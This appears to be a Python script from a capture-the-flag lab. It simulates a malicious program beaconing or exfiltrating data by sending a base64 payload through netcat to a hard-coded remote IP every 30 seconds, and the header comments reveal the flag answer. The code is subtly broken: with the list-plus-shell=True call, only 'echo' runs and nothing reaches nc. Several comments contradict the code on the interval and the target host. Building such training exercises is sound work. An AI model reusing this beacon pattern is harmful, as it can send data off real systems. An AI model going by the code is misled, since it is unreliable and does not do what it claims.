#This script will make a simple call to a remote IP with a payload.
#This can simulate a malicious program exfiltrating data or C2
#Everything is hard coded into the script, no arguments are passed. Change the IP and Port and Payload. Interval can also be adjusted.
#Student should find a payload being sent every 30 seconds in a packet dump.
#Inside the payload is a base64 encoded string
#Decoded it contains the CTF flag: CTF-Hax0r!

#!/usr/bin/env python3
import subprocess
import time

# Define the remote IP address, port, and payload
REMOTE_IP = '192.168.100.20'  # Replace with the actual IP address (current IP maps to httpbin.org
PORT = 443
PAYLOAD = "Q1RGLUhheDByIQ=="

# Function to establish a network connection using nc (netcat)
def establish_network_connection(ip, port, payload):
    try:
        # Use netcat to connect to the remote IP and port, and send the payload
        subprocess.run(['echo', payload] + ['|'] + ['nc', ip, str(port)], shell=True, check=True)
        print(f"Payload sent successfully to {ip}:{port}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to send payload to {ip}:{port}. Error: {e}")

# Main function to establish connection and loop every 10 minutes
def main():
    while True:
        establish_network_connection(REMOTE_IP, PORT, PAYLOAD)
        time.sleep(30)  # Sleep for 30 seconds

if __name__ == "__main__":
    main()
